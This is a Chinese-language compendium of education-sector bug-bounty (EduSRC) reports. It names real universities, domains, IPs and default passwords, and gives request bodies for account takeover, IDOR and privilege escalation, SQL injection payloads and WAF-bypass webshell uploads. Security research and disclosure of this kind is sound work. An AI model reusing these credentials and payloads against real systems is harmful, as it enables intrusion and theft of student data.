# EduSRC 教育行业实战案例（按业务场景组织）

> **回查原文** → `ima-retrieval-index.md` §2.3（教育素材跨 12 个类型目录散落，按"类型目录/其他-EduSRC"两处找；关键词与系统指纹见该表）。

> **来源**：ima 个人知识库 `src` → `src报告/<漏洞类型>/EduSRC`（及各类型下的小程序目录）。
> **组织方式**：**按教育行业业务场景**组织，而非按漏洞类型——教育场景有强烈共性（学号/身份证/邮箱信息收集、统一身份认证、教务/财务/研究生系统、`edu.cn` 资产测绘），按场景切更贴近实战。
> **当前进度**：已完成 **逻辑漏洞** 类（原始 27 条 → 15 个不同案例，21 份唯一文件全量精读，§二）、**越权** 类（原始 48 条 → 42 份唯一 → 34 个有效新案例，§二·补 2.8），以及 **其余九类 + 校园 getshell 长文**（§二·再补 2.9~2.13，2026-09-14 补齐）。**至此 EduSRC 教育侧已深挖的类型全部闭环**。
> **待补**：`其他/EduSRC` 185 份（已做构成调研，见 `other-census.md`；其中单点提交归档约 56 条见 `archive-inventory.md` §1.5，9 篇校园 getshell 长文已并入 §2.9）。

---

## 一、EduSRC 场景总纲（跨类型通用）

| 环节 | 打法 | 要点 |
|------|------|------|
| **资产测绘** | `site:*.edu.cn` + 目标校名 | 教育单位子域极多，教务/学工/研究生/医院/仪器/图书馆各自独立建站 |
| **信息收集（最关键）** | 官网**公示公告附件**（xlsx/pdf） | 奖学金/进步之星/立项名单常附表格，直接含**学号 + 姓名**，是"任意用户密码重置"的前置条件（四川大学案例即靠公示 xlsx 拿到学号） |
| **通用系统识别** | 看登录页 footer / 报错 | 教育行业高度同质化，一套系统多校复用（**E支付/智汇安新 epay**、**yn智慧校园/依能**、**南京南软研究生管理系统**），打通一个即可横向套用 |
| **默认口令** | 超管与低权账号同用默认密码 | 实测：`Axf@02692`、`Axf@02768`、`jjkjzz111`、`1120/1120`、`123456`。教育财务/智慧校园系统**默认密码普遍不改** |
| **未授权 API** | 登录页/前端配置页可直接访问后端接口 | `?method=xxx` 风格（epay）、`/smesis/...`（yn智慧校园）等接口只认 id 不认会话 |
| **弱校验找回密码** | "多因子任选三项"或"只填手机号" | 教育系统找回密码普遍弱于主站，配合公示信息即可接管任意学生账号 |

> **一句话**：EduSRC 的胜负手不在漏洞技巧，在**信息收集**——学号/身份证从公示文件里就能凑齐，剩下的交给弱校验。

---

## 二、逻辑漏洞（本轮 15 案）

### 2.1 账号接管类

#### ① 响应包篡改绕过验证码 → 改绑邮箱接管（企业资产，归档于 EduSRC）
- **目标**：什么值得买 `zhiyou.smzdm.com` → 个人中心 → 账号设置 → 修改邮箱
- **手法**：选"手机短信验证"，抓 `POST /user/email/ajax_check_mobile_code/`，验证码随便填（`000000`）服务端回 `error_code:1`；Burp 替换**响应包**为
  `{"error_code":0,"error_msg":[],"data":[],"goto":"change_email_edit","redirect_to":".../user/email/edit/"}`
  → 前端放行进入"设置新邮箱"，绑定后接管账号（可登录/找回密码）。
- **要点**：凡"改绑手机/邮箱"的验证码步骤，若前端只凭响应包 `error_code` 判成功，改响应即绕过。**改绑定 = 账号接管入口**。

#### ② 弱校验找回密码 → 任意用户密码重置
- **清华大学**（化工系实验室管理系统 `ehs.chemeng.tsinghua.edu.cn`）
  - 短信轰炸：`POST /lsms/register/sendPasswordCode`，body `{"code":"1","phone":"19904457834"}`，**无频控**。
  - 任意改密：`POST /lsms/register/changePassword`，body `{"password":"123456","passwordVerify":"123456","phone":"19904457834"}` —— **只凭手机号改密，不校验短信验证码**。改完 `021059/123456` 直接登录后台。
- **四川大学**（学工一体化平台 `xsc.scu.edu.cn`）
  - 前置：官网公示公告的 **xlsx 附件泄露学号 + 姓名**；
  - 找回密码页**三项信息任选三**（姓名/身份证/手机/邮箱/QQ/微信）即可改密；
  - 邮箱找回走 `http://mail.stu.scu.edu.cn` → `/edu_reg/retrieve/sendConfirmEmail` 响应体**直接回显 `alt_email`（备用邮箱）**；
  - 改密后登录可见身份证号、银行账号、开户行等完整学籍隐私。
- **要点**：教育系统找回密码普遍是"多因子任选"或"仅手机号"，**没有校验"申请人 == 账号所有者"**；先用公示文件补齐因子，再直改。

#### ③ IDOR 越权改密（改 user_id / 改 Cookie）
- **上海交大 科艺工作坊报名系统**（`activity.lib.sjtu.edu.cn/keyi2021`，ASP.NET）
  - 注册两账号 `test66`(id=506) / `test77`(id=507)；
  - test77 在"修改个人信息"改密码，Burp 拦截 `POST /keyi2021/edit_my.aspx?user_id=507`，把 URL 里 `user_id` 改为 **506**，密码设 `admin123` 放包；
  - 用 `test66/admin123` 登录成功。后端**未校验"当前会话用户 == 被修改用户"**。
  - 细节：ASP.NET 表单需带 `VIEWSTATE` / `__EVENTVALIDATION`；报告自述**中危**。
- **浙江大学 微纳公共平台**（`nano.intl.zju.edu.cn/login.aspx`）
  - 登录（`202103120201/123456`）后访问 `GET /admin-userinfo.aspx?ClassID=49`，页面以 **Cookie 决定展示谁的信息**；
  - 改 Cookie `webUserName=str_key=202103120201` → `...202103120202`，即越权看到他人身份证号、手机、地址。
  - 细节：Cookie 形如 `webUserName=str_key=<学工号>`、`webUserPass=str_key=123456`（**密码明文入 Cookie**）。
- **要点**：改资料/改密接口只要"目标用户"由 URL 参数或 Cookie 决定且不校验归属，替换成他人 id 即可改密；**顺带看 Cookie 里有没有明文密码/学号**。

### 2.2 未授权接口 / 拖库类

#### ④ E支付（智汇安新 epay）—— 一套系统打穿多校
- **广东东软学院** `epay.nuit.edu.cn/epay/login`
  1. 超管弱口令 `10007/Axf@02692`（默认），低权 `axfqz_api/Axf@02692`；
  2. `POST /epay/api?method=sysuserFindList`，body `{"custom_login_name":"1","page_size":30,"page_num":1}` → 返回全部**账号、密码（MD5 明文可破）、key_id**；
  3. `POST /epay/api?method=resetPwd`，body `{"user_id":"<key_id>"}` → **仅校验 key_id 即重置任意用户（含超管）密码**，账密回到默认；
  4. 可导出 **3.5 万条学生信息**。后端路径 `/upms-sys/sysuser/resetPwd`。
- **陕西省石油化工学校** `47.101.62.10:8082/epay/login`（同一套系统，验证通用性）
  1. 任意账号登录 `axfqz_api/Axf@02768`；
  2. `method=sysuserFindList` 返回全部账号密码；
  3. `method=resetPwd` 改他人密码（`10011/Axf@02768`）；
  4. `method=sysuserUpdate` 在 args 加 `"role_id":["37cfa85571cd496491448e8adf487425"]` → **垂直提权为超管**；
  5. 超管视角查学生信息 → 泄露全校身份证号。
- **要点**：`?method=xxx` 风格后台的**命门是只认 id、不校验操作者权限**。按 `*FindList` / `*resetPwd` / `*Update` 三个动词扫一遍，常能凑齐"拖库 + 改密 + 提权"三件套。**同一套系统多校复用，打通一个即可横向刷分**。

#### ⑤ yn智慧校园（依能科技）未授权拖师生库
- **江西九江科技中等专业学校** `jjkj.ynedut.com`（成都依能科技）
- 手法：接口未鉴权，默认账密 `3041/jjkjzz111`、`3189/jjkjzz111`；触发搜索时请求
  `POST /smesis/personnellInfoMaintenance/findRSGLSysUserByPlatformSysOrganizationIdsForPage?dataId=&pageNumber=0&pageSize=10&salePattern=Other`
  带上 `X-CSRF-TOKEN` 即返回**全校师生的手机号、身份证、姓名、工号、密码、等级、token**。
- **要点**：智慧校园平台的分页查询接口（`findRSGLSysUser*`）常未授权，`pageSize` 调大即可拖库。

#### ⑥ 校园医院系统——"按任意条件查询"接口未鉴权
- **广西师范大学 医院系统** `gxsdxyy.gxnu.edu.cn`
- 手法：登录页随意输入身份证抓包，`GET /his/h21_ylzh/querybyany?ylzh=<学号>&code=&checkKey=&sfzh=1&lxdh=1` —— `ylzh`（就诊卡号）传**学号**即返回该就诊卡的姓名、班级、身份证加密串、联系方式，响应 `code:200`；用返回的身份信息**直接登录系统**。
- **要点**：医院/校园系统的"按任意条件查询"接口（`querybyany`）若未鉴权，传学号/工号即可拉个人敏感信息并反手登录。

### 2.3 提权 / 越权类

#### ⑦ 返回包 role 篡改 → 前端伪超管
- **上海交大 菁政项目管理系统** `chuntsung.sjtu.edu.cn`（Laravel）
- 手法：普通账号登录后刷新页面，Burp 拦截 `GET /api/v1/sessions`；响应 JSON 含 `user.role`（普通用户非 1），把 **`role` 改为 `1`** 放包 → 前端按超级管理员渲染，出现"用户管理 / 导师列表 / 学生列表"（545 条记录）等超管菜单。
- 细节：Cookie 含 `laravel_session`、`XSRF-TOKEN`；`role=1` 标识超管；**后端无二次校验**。
- **要点**：SPA/前后端分离站点，权限若由返回包 `role` 驱动，改包即伪超管。审计点：`/api/*/sessions`、`/api/*/me`、`/api/*/profile`。

#### ⑧ 未授权改系统配置
- **上海交大 分析测试中心仪器共享平台** `http://61.173.48.179:18108`
- 手法：直接访问 `/homepz.html`（前台配置页），**无需登录**即见"前台配置 / 数据库配置"入口，提交数据库地址 / 登录名 / 密码（`21/21212/1211`）即**任意修改数据库配置**；改后前台提示"请去后台添加栏目编号为 5 的新闻"。
- **要点**：高校仪器/资源预约平台常遗留未鉴权的"系统配置"后台页，扫 `/homepz.html`、`/config`、`/*setup*` 类路径可改库连接（→ 脱库或破坏）。

### 2.4 验证码 / 短信类

#### ⑨ 4 位短信验证码全空间爆破
- **上海交大 流调登记系统** `es.sjtu.edu.cn/ui/login`
- 手法：登录 `POST /api/login`，参数 `phone` + `smsVerCode` + `checked`；验证码**仅 4 位数字**且**无失败锁定/频控**；Burp Intruder 数值型 payload `From 0 To 9999`（Number format 最小 4 位），命中 `3664` 后登录任意账号。
- **要点**：4 位纯数字 = 1 万空间，万级可秒破。判定条件不是"能不能爆破"，而是**有没有失败计数/锁定/图形码升级**。

#### ⑩ 短信轰炸
- 见 2.1-② 清华大学 `POST /lsms/register/sendPasswordCode`，无频控。

### 2.5 小程序 / 移动端

#### ⑪ 返回包布尔字段绕过绑定校验
- **上海交大 微信小程序「交大人」**（appid `wxbb9232e814f39486`）
- 手法：小程序正常需绑定 jAccount（弹"尚未绑定 jAccount 账号"）。抓 `wx/login.php?o=<openid>&token=<token>` 的返回包，`entity` 含 **`hasLocalAccount`**，未绑定时为 `0`；篡改为 `1` 放包 → 前端认为已绑定，跳过绑定直接进入首页（运动数据等），实现未授权访问。
- 细节：返回 `Set-Cookie: SJTU-HEALTH=...`。
- **要点**：小程序/APP 用**返回包布尔字段**（`hasLocalAccount` / `isBind` / `bound`）控登录态时，改返回包即可绕过绑定或登录。审计点：`/wx/login.php`、`/api/login` 类接口的返回体。

### 2.6 综合攻击链（SQL → 绕 WAF → getshell）

#### ⑫ 研究生管理系统：列目录 + 堆叠注入 + base64 绕 WAF 写马
- **河南师范大学 研究生管理系统** `yjs.htu.edu.cn/gmis`（南京南软 V3.0）
- 手法链路：
  1. **列目录**：部分路径未授权可列目录、泄露敏感信息；
  2. **爆破账号**：拿到有效账号 `1120/1120` 登录；
  3. **堆叠注入**：多路径存在，如 `http://yjs.htu.edu.cn/gmis/Byyxwgl/byzhsb.aspx`，**可堆叠查询**，能执行命令；
  4. **绕 WAF 写 shell**：用堆叠查询查出网站根目录，再用 **base64 编码绕过 WAF** 写入 ASPX 木马，shell 地址 `http://yjs.htu.edu.cn/gmis/4.aspx`，getshell。
- **要点**：研究生/教务类 ASP.NET 系统常见可堆叠注入；链条固定为"列目录定根路径 → base64 绕 WAF → 写 aspx 马"。报告自述**高危（Rank 5）**。

### 2.7 素材受限（未能完全还原）

- **上海交大 网课购买系统（`上交逻辑.png`）**：报告记测试账号 `1111@163.com`、`admin123@163.com`；"购买课程"选"七月网课项目"显示价格 **27810**，疑似可篡改订单金额/数量实现低价或免费购买；**具体篡改点因图片 OCR 不完整未能还原**。已入库的只是线索（价格参数 27810 + 购买接口），完整绕过步骤缺失。

---

## 二·补 越权 / 未授权（EduSRC 越权 47 条 → 42 份唯一 → 精读）

> 素材来源：`src报告/越权/EduSRC`（47 条）+ `越权/小程序`（1 条，与 Web 重复）。去重后 **42 份唯一**，精读稿 `_work/deep-idor-e.md`（E1–E21）、`_work/deep-idor-f.md`（E22–E41）。原始清单见 `_work/unique-list-idor.md` §二。
> 组织方式：**按教育业务场景**切，而非按越权子类型——教育行业同一套"改学号/改 id 遍历"在门户、学工、教务、后勤里反复出现。

### 2.8.0 场景总表（一眼看全）

| # | 场景 | 案例 | 核心越权点 | 危害 |
|---|------|------|-----------|------|
| A | **门户 / 办事流程 / 事务中心** | E1/E2 亳州学院 | `/zhxyApi/workflow/formShowView?applyId=` 改他人流程 id | 中（身份证/手机） |
| B | **学工 / 学籍 / 就业** | E3/E4 东北林大；E7/E8 广东培正；E13 华东理工；E28 上海理工；E29/E30 上海商学院；E32–E36 同济；E37/E38 新疆交通 | `getObjList` 改学号 / `insuranceApplicationId` 自增 / `Xsxh`（学号）遍历 / `XSBH`·`xshB` 遍历 / `loginUserl` 改学号 | 中–高（批量学生 PII） |
| C | **教务 / 研究生 / 证书** | E14 江苏海洋·南软 V4.0；E18 南开；E20 清华 IRB | 未授权上传 getshell / `switchPosition=1` 提权 / `queryqg_user.action` 改 `userid` | 高 |
| D | **一卡通 / 后勤 / 宿舍 / 医院** | E5/E6 电子科大后勤小程序；E9/E10 广西大学一卡通；E15–E17 兰大；E19 南开宿舍 | `js_code` 未授权 / swagger 枚举 id / 响应 `status` 绕登录 / `getMembers.do` 未授权 | 中–高 |
| E | **统一身份认证下的业务系统**（webvpn/CAS） | E3/E4、E15–E19 均属此类 | 单点登录后各子系统**不二次校验**，抓 id 即越权 | 高 |
| F | **采购 / 报名 / 招标** | E11/E12 华东师范采购报名 | 任意注册 + 删响应 `jpg$1` 后缀绕校验 → 拖全量附件 | 高（2764 份证件照） |
| G | **平台级未授权**（院系/实验室/仿真） | E22–E24 上海交大 `sa.sjtu.edu.cn`；E25 上海交大仿真平台；E39 三目标 | `#/` 路由直访即无鉴权 / `/api/v1/user?autoids=` 遍历 / `UserDetail.jspx?id=UUID` | 高 |
| H | **小程序** | E5/E6 电子科大后勤；E21 上海交大就业；W36/W39 交大就业·知行安泰 | 小程序 `js_code` / `qxid` 当身份凭证 | 中–高 |

### 2.8.1 高价值案例详录

#### ① 越权打通"能批量出数据"的接口（最稳的成单点）
- **东北林业大学 E3/E4**（`i.webvpn.nefu.edu.cn` 学团系统 + 外事系统）
  - 学团：抓 `POST /dcp_sis/tyxxzcsq/tyxxzcsq.action`，体 `{"map":{"method":"getObjList","params":{"list":["2019224158"]}}}`，**改 `list` 里的学号**为重放他人 → 返回该生身份证 `SFZJH`、手机 `LXDH`、邮箱、宿舍，学号可遍历全校。
  - 外事：`GET /StudentExchange_2007/ProjectDetail.do?token=…&secode=1100002007STPR20210002`，改 `secode` 越权看他人的项目。
  - **要点**：webvpn 单点下的业务系统常把学号/项目编号当查询键且无归属校验；抓 POST body 里的 `list`/`id` 数组改值即可批量拖库。
- **广东培正学院 E7/E8**（`pzxg.peizheng.edu.cn/sms3` 学工-医保记录）
  - CAS 登录（`cas0.peizheng.edu.cn`）后点"查看"抓 `GET /sms3/student/insurance_pz/stulnsurance/insuranceApplicationDetail.jsp?insuranceApplicationId=28535`，**改 `insuranceApplicationId` 为 28536/28537** → 返回他人姓名/学号/性别/医保类型。**自增数字 ID + 无归属校验 = 一键遍历全校**。
- **上海理工 E28 / 上海商学院 E29/E30**（就业信息服务网，**同一套源码**）
  - 未登录直接 `GET /manage/StudentInfoEdit.aspx?Xsxh=1612440304`（`91.usst.edu.cn`）返回姓名/学号/身份证/考生号/学院/专业；`GET /manage/RecommendationForm.aspx?Xsxh=1812440121` 返回就业推荐表（手机/邮箱/获奖/实习）。
  - **同一款"就业信息服务网"被多校复用**（上海商学院 `jiuye.sbs.edu.cn` 参数与接口完全一致）→ 通用打法：直请求 `/manage/*.aspx?Xsxh=` 验未授权 + 遍历学号（学号有规律：入学年+院代码+序列）。
- **同济大学 E32–E36（5 图，共 8 个越权点）**
  - 电子证明：`GET zw.tongji.edu.cn/wec-self-print-app-console/item/sp-print-item/preview/terminal?…reportPathParam=%26h3D2210897`，改 `reportPathParam` 下他人在读证明。
  - 就业系统：`POST jjyzx.tongji.edu.cn/jyfw/sys/dshy/modules/sydhxt/xlssxx.do` 遍历 `xshB` 取他人电话/邮箱；`XSBH=2210896` 遍历取姓名/电话/学院/专业；`jynfnbx.do` 可改他人生源核对信息。
  - 教育测评：`daf.tongji.edu.cn` 爆破 id `84157~845715`（约 8.5 万条）取身份证/姓名/手机。
  - 统一消息：`zcb.tongji.edu.cn/xtzgl/WriteMsg.jsp?…&msgUrlParam=1m=11140` / `zsb.tongji.edu.cn/ywsp/ywylz/cysyj_EditPage.jsp` **按学号对任意人发消息**（叠加冒用危害）。
  - **要点**：`XSBH`/`xshB` 是用户标识且缺鉴权；`WriteMsg` 类接口可按学号发信。
- **广西大学 E9/E10**（一卡通平台 swagger 未授权，同 IP）
  - `210.36.24.23:8010` 同 IP 暴露 swagger/接口文档，直接调用学生信息接口返回电话/身份证/账号/**明文密码**/专业，id 可枚举（1903/1904…）→ 拖 3000+ 学生。**高校站点同 IP/同段常部署未鉴权 swagger**。
- **新疆交通职业技术学院 E37/E38**（智慧学工 自助打印导出）
  - 登录后导出"学工综合信息导出 2023"，抓 `POST www.xjjtxy.top`，体含 `list=&mbid=9df6c8d8-…&loginUserl=&ype=stu`，**改 `loginUserl`（学号）** → 导出其他学生姓名/身份证/生源地/民族。

#### ② 响应包篡改绕过登录 → 更进一步提权
- **兰州大学 后勤保障部 HR 系统 E15**（`hr.lz-cc.com`）
  - 任意账号 `admin/admin` 登录，拦截登录响应把 `"status":2`（"请登录"）改成 `"status":1`（或 Burp Match/Replace 自动替换）→ 进后台；读 js 发现 `/#/statistics/staffList` 导出接口，未鉴权下载 **1700+ 员工**身份证/手机/姓名/住址。
- **兰州大学 萃英学院学生成长信息系统 E16/E17**（`120.55.183.163:7000`）
  - `POST /api/login`（`admin/123456`）拦截响应把 `status` 改 `1000`、`SignId` 改 `1` → 以管理员进后台；信息管理→新增账号，**可批量添加素质学分管理员/辅导员/教师账号密码**（接管系统）。
  - 注意：E15 与 E17 是**两个不同系统**（后勤 HR vs 萃英学院），同校不同站。
- **南开大学 E18（综合渗透，多链）**
  - 垂直越权：学生账号登录后 `POST /auth/switchPosition positionId=1` **直接变管理员**；`superadmin` 调 `/sys/log/loadLogLoginAndOutList` 拿所有登录过的账号密码。
  - 数据泄露：`/gradms/base/infoStutrainInfo/loadInfoStutrainInfoList` 拉学生身份证+姓名+学号（GET 改 POST）。
  - 上传 getshell：头像处安全狗 WAF，先传 `11.jpg` 改 `11.html.ashx`，用接口返回的 Ticket `104DCCCA002D5F067BFD970D2CF37410` 绕过 → 插免杀 ashx 马。
  - SQL 注入：`/apps/MyVideo/TeacherSchool/MyStudent.aspx` 用 `//` 注释绕过；`faq.php` 报错注入。
- **用友 NC 式登录绕过（教育侧同源）**：见 `idor-cases.md` §3.3（`/fs/console` 改 `login:true`）。

#### ③ 平台级未授权（院系 / 实验室 / 仿真 / 采购）
- **上海交大 院系管理系统 E22–E24**（`sa.sjtu.edu.cn`，三版同源）
  - 普通账号 `zxx0512@sjtu.edu.cn` 登录后**直接访问本应受限的管理页即可操作**，服务端未校验操作权限：`/user/index#/data_subject` 看全校总体数据；`#/yxkh_yxbq`、`#/target_manage` 增删改；`#/label_manage` 改校级标签 `POST /label/save?id=20190717258a70c9add2&labelname=arwu&labeltype=论文标签&labellevel=校级&labelcolor=#106FC6`。**可污染整个校级标签体系**。
- **上海交大 虚拟仿真教学实验平台 E25**（多域名）
  - 注册 `admin1234/admin123` 登录；`/user/userItem.html?pid=` 可遍历学生 id（无登录无痕模式也可访问）；核心未授权接口 `/api/v1/user?split=,&get_users_info&autoids=999` 直接返回身份证/邮箱/手机号（unicode 编码），爆破 `autoids` 遍历全校；`/api/v1/param` **泄露数据库凭据 `root/root/3313`**；`/api/v1/log` 泄露登录日志。同站三域名 `ynhongce.com:9800`、`virtualone.moocmooe.com:9800`、`tjsydxjxgcxy.moocmooe.com:9800`；`number` 字段存在存储 XSS。
- **华东师范大学 采购报名管理系统 E11/E12**
  - 允许**任意注册**；前端 js 找到文件管理上传接口 `/lcpz/fjgl_index.jsp?Operation_Code=CGXX_YHXX&ywwid=…`；上传 jpg 抓包，响应出现 `jpg$1` 后缀校验串，**删掉 `jpg$1` 放包** → 得到附件管理接口 `/lcpz/fjgl_index.jsp?CanEdit=…`（未鉴权），共 **2764 条**可下载身份证照片/营业执照/授权书，并可删除。
  - **要点**：上传点响应夹带后缀校验串（`jpg$1`），删掉即绕过后缀限制。
- **江苏海洋大学 南京南软研究生管理系统 V4.0 E14**
  - 未授权上传 → 安全狗检测文件头+文件体，**在文件头与文件体内插垃圾字符**干扰 WAF → 目标站无 `Byyxwgl/Uploadfiles` 目录，文件名前加 `../` 上跳一级写到可解析路径 → getshell。高危 Rank7。

#### ④ 人员/权限查询接口 → 越权到管理员
- **清华大学 医学伦理委员会 IRB 系统 E20**（`irb.med.tsinghua.edu.cn`）
  - 注册 `xiaolong/Qwer1234` 登录，抓 `POST /asdcthethics/privisys/queryqg_user.action`，体 `dataxml={"userid":"388"}`；**把 `userid` 改成 1** 再 URL 编码重放 → 返回 admin 超管信息（登录名/姓名/联系方式 `13896520302`/有效期），可遍历 `userid` 拉全部人员。
- **教育局在线考试系统 E39**（三目标之一）
  - `url /talk/UserDetail.jspx?id=7f072962-da70-43b3-a73d-ce7f70af6012`，**无痕模式直接查看并修改用户资料**（姓名/身份证/学号/部门），id 为 UUID 可遍历。同批另两目标：xx学院未授权访问内网打印机 `HP LaserJet MFP M227sdn`；某考试院万能表单 `POST /function/form.php?action=input` 用 `1/**/and/**/sleep(10)=xxx` 确认时间盲注。
- **南开大学 宿舍管理系统 E19**（`suguan.nankai.edu.cn`，经 webvpn）
  - 仅能提交本人申请，但在 js 中发现未授权接口 `POST /sg-stu-app/stu/getMembers.do`，带 Jtoken 直接调用 → 返回全校学生身份证 `stuCreditCode`/学号/姓名/专业/校区/房间号，可遍历。

#### ⑤ 门户/办事流程越权（教育特色场景）
- **亳州学院 E1/E2**（`oshall.bzuu.edu.cn/zhxy` 事务中心）
  - 抓 `GET /zhxyApi/workflow/formShowView?applyId=93cf329b…`，从**历史接口列表响应里拿他人流程 `id`**（如 `e1693acb5f0d4eaeafb0641ab4e9decb`），改成他人 id 重放 → 返回他人流程表单含身份证 `sfzh`/姓名/手机号。
- **华东理工大学 E13**（注：文件名标"华东师范"，实际 `career.ecust.edu.cn` 为华东理工）
  - **未登录、无 Cookie** 直接访问 `/manage/downloaddata.aspx`，选毕业年份即下载"全部数据/毕业生签约单位名录/生源核对信息" → 学号/身份证/家庭地址/手机/邮箱批量泄露。
- **电子科技大学 后勤商贸小程序 E5/E6**
  - 抓 `GET https://hq.uestc.edu.cn.cn/443/hqsm/epos/userOrder/userWinIndex?js_code=073XniFa1…`，**该接口以微信 `js_code` 直接定位用户订单**，未校验调用者，替换他人 `js_code` 可越权拉他人校园超市订单/水券（复现需删小程序重进重置 `js_code`）。

### 2.8.2 教育行业越权 Checklist（叠加 §三）

1. [ ] **学号是最好的钥匙**：先做信息收集（公示 xlsx / 学号规律 = 入学年+院代码+序列），再把学号塞进 `Xsxh`/`loginId`/`list`/`XSBH`/`xshB`/`loginUserl`/`stuCode` 类参数遍历；
2. [ ] **统一身份认证不等于二次鉴权**：CAS/webvpn/Jaccount 登录后，各子系统的接口**仍要单独测**（北林、兰大、南开、同济全部踩坑）；
3. [ ] **自增数字 ID / UUID 直接取数**：`insuranceApplicationId`、`autoids`、`applyId`、`pid`、`secode` 一律先遍历验证；
4. [ ] **swagger / 接口文档 / js 里的接口**：同 IP 扫端口看 swagger；登录后读 js 找 `getXxx.do`/`/api/v1/*` 未授权接口；
5. [ ] **响应包状态值**：登录响应 `status`/`SignId`、操作响应 `success`/`flag` 都改一遍；
6. [ ] **"新增账号 / 改配置 / 改标签"写接口**：低权限直访管理页 `#/xxx` 路由，测写操作是否校验操作权限；
7. [ ] **上传点响应夹带校验串**（`jpg$1`）：删了再说；
8. [ ] **小程序身份凭证**：`js_code`/`qxid`/`hasLocalAccount` 是否可替换/篡改。

---

## 二·再补 其余漏洞类型（教育侧全量深挖，2026-09-14 补齐）

> **来源**：ima `src报告/` 下 SQL注入 EduSRC 43、XSS 4、信息泄露 7、CSRF 4、文件上传 6、弱口令 10、SSRF 2、命令注入 2、XXE 1，以及「其他/EduSRC」中 9 篇校园 getshell 长文——去重后精读约 50 份。
> ⚠️ **红线**：教育侧原始报告多标注"（不打码）"，含真实师生身份证/手机号/家庭地址。本节一律只写"可获取师生身份证/手机号"这类描述，**不抄录任何真实个人数据**；WAF 绕过、落地后门、钓鱼社工相关内容**仅作威胁认知与防守复盘，SRC 一律不做**（上传验证止于无害证明，SSRF 止于证明可达）。

### 2.9 校园系统 getshell 与文件上传（正方 / 强智 / 南软 / 先极 / 微宏 / 东方仿真）

**场景说明**：高校业务系统高度集中在**正方 / 强智 / 南京南软 / 南京先极 / 微宏 OA** 等少数二开源码，**同一套系统横扫多校**；通病是**上传后缀校验缺失、S2-020 未修、WAF 仅做关键词与后缀黑名单**。入口账号多来自官网公示/招生信息泄露的学号与默认口令。

| # | 学校 / 系统 | 入口权限 | 上传点 | 绕过手法 | 战果 |
|---|------------|---------|--------|---------|------|
| 2.9.1 | 北京中医药大学 · 正方学工 | 学生 | `commXszz.do?method=uploadFile` | 追加上千个 `&a=1` 撑满请求体绕参数式 WAF；Tomcat `aliases` 别名映射落马 | getshell |
| 2.9.2 | 华北电力 · 南软研究生 V5.0 | 学生 | `student/grgl/uploadkszp` 头像 | 后端只删"学号+白名单后缀"，未校验真实后缀 → 直传 `.aspx` | getshell（高危 Rank 6） |
| 2.9.3 | 华东理工 · 强智教务 | 公网 | `fxglAction.do?method=fxbmzctz` | S2-020 改 `class.classLoader...docBase=/` 读全量文件 | 任意文件读 + 源码审计（中危 Rank 6） |
| 2.9.4 | 河海大学 · 南软研究生 V5.0 | 教师 | 同南软系 `uploadkszp` | 用 `jsbh` 参数**跨目录把马写进网站根目录** | getshell（高危） |
| 2.9.5 | 宁波大学 · 微宏 OA | 个人信息改相片 | 传 `jpg` 后缀 jsp 马，抓包把 `ext` 改回 `jsp` | 文件名 `../../server/wh/;/../a`（纯 `../` 触发 WAF）；文件体填垃圾字符 | getshell（高危 Rank 6） |
| 2.9.6 | 南通大学 · 先极实验管理 | 添加图片 | 图片地址处传 `aspx` | 抓包改后缀 + 填垃圾字符并注释 + 加 `<header runat="server"/>` + 文件名加 `../`（后端自动删且限长 ≤160） | getshell（高危 Rank 4） |
| 2.9.7 | 中国海洋大学 · 先极创新 | — | `cxcy/NewsImages/` | 后缀用 `asmx`+空格，`Class` 与 `Language` 间插**大量换行**拆散关键词 | getshell（高危 Rank 3） |
| 2.9.8 | 重庆医科大学 · 南软研究生 V5.0 | 无限制 | 同南软系 | 后缀未校验写 `.aspx` | getshell（高危，可达范围最大） |
| 2.9.9 | 聊城大学 · 东方仿真 | 学习记录搜索 | — | 搜索条件 **SQL 注入 + 堆叠执行系统命令** → 上线 CS | RCE + 横向（高危 Rank 0） |
| 2.9.10 | 长安大学 · 公司注册与招标报名 | 自注册 | 公司信息修改扫描件 | 文件名 `jsp` 后加换行符 + 文件体带 pdf 头 + `FileOutputStream` 后插换行符绕关键字 | 过渡 jsp 落地后再写 jspx |
| 2.9.11 | 华南农业大学 · 廉洁风险防控 | 用户管理头像 | 直传 `.jspx` | 过渡文件读请求参数 `f` → BASE64 解码 → `FileOutputStream` 写 web 根 | getshell（高危 Rank 6） |
| 2.9.12 | 某工业大学 / 某师范 | 后台 | `POST /xupload/uploadUserImg?fileType=1` | 黑名单列了 `.jsp` 却仍放行（师范"人人通空间"换头像无任何限制） | 直传 `.aspx` getshell（root） |

> 2.9.7 的 `asmx`+空格+换行拆词、2.9.5 的 `/wh/;/../`、2.9.6 的"后端自动删 `../` 且限长"是三种**别的报告里没有的 WAF 绕过思路**，遇到 `.aspx`/Java 系校园系统优先试。

**小结**：getshell 三要素——**有上传点 + 后缀校验只做前端/黑名单 + WAF 只匹配关键词**。教育侧最高频的是头像/扫描件/附件上传处，`.aspx`/`.jspx` 直传成功率远高于企业目标。

### 2.10 注入类（SQL 注入 → 命令执行 / getshell）

| # | 学校 / 系统 | 注入点与参数 | 手法 | 战果 |
|---|------------|------------|------|------|
| 2.10.1 | 吉林工业职业技术大学 · 奥普基 AI 工作流 | cookie `FK_Dept` | WAF bypass（原稿 OCR 乱码，payload 待回 ima 补录） | 高危 |
| 2.10.2 | edu 多系统"九连杀" | `AUD_RESOURCE`/`ZHCZLXID`/`SQMC` | `sqlmap -r post.txt -p 参数 --tamper=space2comment` 时间盲注 | 中危，同类重复仅 1~4 分 |
| 2.10.3 | 多校小程序 json 接口 | `order_flow_status`/身份证字段 | WAF 禁 `select/ascii/substr/sleep` → 改 `exp(0)=1` 布尔、`ord()+right()`；Oracle 用 `DBMS_PIPE.RECEIVE_MESSAGE('ICQ',5)` 延时、`utl_inaddr.get_host_address` DNSLog | 中危 |
| 2.10.4 | 中国农业大学 | `POST /system/role/list` 的 `dataScope` | `extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e))` XPATH 报错回显；另见弱口令 `admin/admin123`、Shiro 反序列化 | 高危 |
| 2.10.5 | 某大学 MSSQL | `id` | `and exists(select count(*) from sysobjects)` 判库、`substring((select @@version),22,4)` 判版本、`IS_MEMBER('db_owner')` 判权限、查 `master..sysobjects where name='xp_cmdshell'` 判命令执行 | 高危 |
| 2.10.6 | 汕头技师学院 | `txtName`（.NET 报错暴露 `order by ZYOrder,zymc`） | 堆叠 `1';select 1/db_name()--` 确认 MSSQL 2008 R2 | 高危 |
